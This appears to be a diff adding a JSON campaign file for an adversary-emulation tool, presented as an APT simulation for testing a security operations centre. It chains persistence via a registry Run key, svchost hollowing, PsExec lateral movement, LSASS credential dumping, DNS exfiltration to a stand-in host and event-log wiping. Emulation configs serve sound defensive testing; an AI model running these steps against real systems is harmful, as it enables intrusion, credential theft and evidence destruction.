@@ -1,0 +1,208 @@
+{
+  "name": "Example APT Campaign",
+  "description": "A comprehensive APT simulation campaign for SOC testing",
+  "version": "1.0.0",
+  "fail_fast": false,
+  "operations": [
+    {
+      "name": "Initial Reconnaissance",
+      "description": "Perform passive reconnaissance of target network",
+      "operation": "reconnaissance",
+      "data": {
+        "passive": {
+          "gather": {
+            "target": "example.com",
+            "method": "whois"
+          }
+        }
+      }
+    },
+    {
+      "name": "Active Scanning",
+      "description": "Perform active scanning of discovered hosts",
+      "operation": "reconnaissance",
+      "data": {
+        "active": {
+          "scan": {
+            "target": "192.168.1.0/24",
+            "ports": [22, 80, 443, 445, 3389],
+            "method": "tcp_connect"
+          }
+        }
+      }
+    },
+    {
+      "name": "Initial Access via Phishing",
+      "description": "Gain initial access through simulated phishing",
+      "operation": "initial_access",
+      "data": {
+        "phishing": {
+          "email": {
+            "target": "user@example.com",
+            "template": "invoice",
+            "attachment": true
+          }
+        }
+      }
+    },
+    {
+      "name": "Execute Payload",
+      "description": "Execute payload on compromised host",
+      "operation": "execution",
+      "data": {
+        "command": {
+          "shell": {
+            "command": "cmd.exe",
+            "method": "direct",
+            "arguments": "/c whoami && hostname && ipconfig /all"
+          }
+        }
+      }
+    },
+    {
+      "name": "Establish Persistence",
+      "description": "Create persistence mechanism",
+      "operation": "persistence",
+      "data": {
+        "registry": {
+          "run_key": {
+            "hive": "HKCU",
+            "key": "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "value": "BlueFireAgent",
+            "data": "C:\\Windows\\System32\\cmd.exe /c start C:\\Users\\Public\\agent.exe"
+          }
+        }
+      }
+    },
+    {
+      "name": "Deploy Defense Evasion",
+      "description": "Apply defense evasion techniques",
+      "operation": "defense_evasion",
+      "data": {
+        "process": {
+          "hollowing": {
+            "target_process": "svchost.exe",
+            "method": "create_suspend"
+          }
+        }
+      }
+    },
+    {
+      "name": "Lateral Movement via PsExec",
+      "description": "Move laterally to another host",
+      "operation": "lateral_movement",
+      "data": {
+        "remote_execution": {
+          "psexec": {
+            "target": "192.168.1.100",
+            "command": "cmd.exe /c whoami",
+            "copy": true
+          }
+        }
+      }
+    },
+    {
+      "name": "Command and Control",
+      "description": "Establish C2 channel",
+      "operation": "command_control",
+      "data": {
+        "protocol": {
+          "https": {
+            "domain": "legitimate-looking-domain.com",
+            "port": 443,
+            "interval": 60,
+            "jitter": 30
+          }
+        }
+      }
+    },
+    {
+      "name": "Credential Access",
+      "description": "Harvest credentials from compromised host",
+      "operation": "credential_access",
+      "data": {
+        "dumping": {
+          "memory": {
+            "target_process": "lsass.exe",
+            "method": "direct"
+          }
+        }
+      }
+    },
+    {
+      "name": "Data Collection",
+      "description": "Collect sensitive data",
+      "operation": "collection",
+      "data": {
+        "files": {
+          "targets": ["*.doc", "*.pdf", "*.xls"],
+          "locations": ["C:\\Users\\*\\Documents", "C:\\Users\\*\\Desktop"],
+          "max_size": 10000000
+        }
+      }
+    },
+    {
+      "name": "Data Compression",
+      "description": "Compress collected data",
+      "operation": "exfiltration",
+      "data": {
+        "transformation": {
+          "compression": {
+            "algorithm": "gzip",
+            "level": 9,
+            "data": "{PREVIOUS_RESULT}"
+          }
+        }
+      }
+    },
+    {
+      "name": "Data Encryption",
+      "description": "Encrypt compressed data",
+      "operation": "exfiltration",
+      "data": {
+        "transformation": {
+          "encryption": {
+            "algorithm": "aes",
+            "key_size": 256,
+            "mode": "cbc",
+            "data": "{PREVIOUS_RESULT}"
+          }
+        }
+      }
+    },
+    {
+      "name": "Data Exfiltration",
+      "description": "Exfiltrate encrypted data",
+      "operation": "exfiltration",
+      "data": {
+        "network": {
+          "dns": {
+            "domain": "exfil.example.com",
+            "record_type": "txt",
+            "chunk_size": 32,
+            "interval": 2.0,
+            "data": "{PREVIOUS_RESULT}"
+          }
+        }
+      }
+    },
+    {
+      "name": "Cleanup",
+      "description": "Remove evidence of activities",
+      "operation": "impact",
+      "data": {
+        "erase": {
+          "files": ["C:\\Users\\Public\\agent.exe"],
+          "logs": ["System", "Security", "Application"],
+          "method": "secure_delete"
+        }
+      }
+    }
+  ],
+  "reporting": {
+    "format": "json",
+    "output_file": "campaign_results.json",
+    "include_timing": true,
+    "include_details": true
+  }
+} 
